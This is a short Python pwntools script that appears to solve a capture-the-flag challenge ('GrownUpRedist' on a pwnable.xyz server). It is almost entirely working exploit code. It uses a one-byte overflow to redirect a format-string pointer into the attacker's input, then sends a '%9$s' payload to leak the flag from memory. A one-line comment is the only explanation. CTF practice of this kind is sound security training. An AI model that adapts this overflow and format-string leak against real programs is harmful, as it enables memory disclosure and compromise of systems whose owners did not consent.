from pwn import *
#p=process("./GrownUpRedist")
p=remote("svc.pwnable.xyz",30004)

#overflow of one byte, shifts the format_string pointer into the buffer input where we put $9%s, which is the flag

p.sendafter("?",b"y"*8+p64(0x601080))

pay="A"*0x20+"%9$s "
pay+="A"*(128-len(pay))

p.sendafter(":",pay)
p.interactive()